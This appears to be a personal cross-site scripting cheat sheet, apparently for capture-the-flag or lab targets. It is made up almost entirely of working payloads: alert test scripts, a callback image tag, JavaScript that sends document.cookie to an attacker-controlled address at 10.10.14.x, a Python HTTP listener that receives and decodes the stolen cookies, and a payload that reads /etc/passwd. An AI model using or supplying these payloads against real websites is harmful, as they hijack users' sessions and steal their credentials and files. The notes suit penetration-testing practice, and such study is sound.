# XSS

<u>**Quick scripts to try:**</u>

```javascript
<script type="text/javascript">alert('TEST');</script>

<script type="text/javascript">alert(9999);</script>
```



<u>**Quick XSS Callback Test:**</u>

Make a file named `test.html` with contents:

```html
<img src="http://10.10.14.8/test.jpg">test</a>
```

Start python server.

Then copy and paste that into forms



<u>**Stealing cookies:**</u>

```javascript
#create a cookie.js
var request = new XMLHttpRequest();
request.open('GET', 'http://10.10.14.5/?test='+document.cookie, true);
request.send()

#trigger by copying and pasting
<img src="10.10.14.5/test.jpg" /> <script src="http://10.10.14.5/cookie.js"></script>
```

Use steal.js with Python3 HTTP server to receive and decode requests saved in cookie.py:

```python
import base64
import http.server
import urllib.parse
import socketserver
class MyHandler(http.server.SimpleHTTPRequestHandler):
  def do_GET(self):
      URL = urllib.parse.urlparse(self.path)
      for k,v_b64 in urllib.parse.parse_qs(URL.query).items():
        try:
          v = base64.b64decode(v_b64[0]).decode().strip()
          print(f'{self.client_address[0]} DECODED COOKIE: {v}')
        except:
          v = v_b64[0].strip()
          print(f'{self.client_address[0]} RAW COOKIE: {v}')
      super().do_GET()

with socketserver.TCPServer(("0.0.0.0", 80), MyHandler) as httpd:
	httpd.serve_forever()
```

Then run the server as follows, resend the message:

```bash
sudo python3 cookie.py

#trigger
<img src=x onerror=javascript:this.src='http://10.10.14.8/?c='+encodeURIComponent(btoa(document.cookie));>
```

And after waiting for a bit, the admin cookie is given!



**<u>Local File Read:</u>**

More explanation here: https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html

```javascript
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

